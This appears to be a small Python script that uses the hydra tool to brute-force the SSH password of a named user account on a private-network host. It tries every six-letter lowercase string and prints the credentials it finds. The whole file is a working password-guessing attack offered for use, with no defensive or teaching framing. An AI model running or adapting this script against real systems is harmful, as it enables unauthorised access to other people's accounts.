#!/usr/bin/env python3
#Import Library
import os

print("\n Initiating connection, please be patient...\n")

#This will try to get the password of a user account we're interested in.
brute_forcer=os.system("hydra -t 1 -V -f -l Bdarboe -x 6:6:a ssh:// 192.168.0.1")

#The username and password will be displayed on the screen for us to see. 
print(brute_forcer)
